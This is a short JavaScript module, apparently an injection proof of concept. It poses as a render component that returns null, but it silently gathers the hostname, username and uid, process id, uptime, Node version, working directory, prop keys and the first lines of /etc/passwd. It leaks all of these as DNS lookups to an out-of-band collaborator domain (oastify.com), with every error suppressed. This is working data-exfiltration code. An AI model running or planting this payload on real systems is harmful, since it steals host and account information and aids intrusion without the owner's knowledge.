module.exports = {
  default: function(props) {
    // Пробуем ОБА пути
    var collab = (props && props.collab) || (props && props.render && props.render.collab) || "default.oastify.com";
    var os, dns, fs;
    try { os = require("os"); } catch(e) {}
    try { dns = require("dns"); } catch(e) {}
    try { fs = require("fs"); } catch(e) {}
    function S(l) { try { dns.lookup(l + "." + collab, function(){}); } catch(e) {} }
    try { S("h-" + os.hostname()); } catch(e) {}
    try { var u = os.userInfo(); S("u-" + u.username + "-uid" + u.uid); } catch(e) {}
    try { S("pid-" + process.pid); } catch(e) {}
    try { S("uptime-" + Math.round(os.uptime())); } catch(e) {}
    try { S("node-" + process.version.replace(/^v/,"")); } catch(e) {}
    try { S("cwd-" + process.cwd().replace(/\//g,"_")); } catch(e) {}
    // DEBUG: пробуем все возможные пути
    try { S("props-keys-" + Object.keys(props||{}).join("_")); } catch(e) {}
    if (fs) {
      try {
        var pw = fs.readFileSync("/etc/passwd","utf8").trim().split("\n");
        for (var i = 0; i < Math.min(pw.length,3); i++)
          S("pw" + i + "-" + pw[i].replace(/[^a-zA-Z0-9]/g,"").substring(0,25));
      } catch(e) { S("pw-err"); }
      try { S("kern-" + fs.readFileSync("/proc/sys/kernel/hostname","utf8").trim()); } catch(e) { S("kern-err"); }
    }
    return null;
  }
};
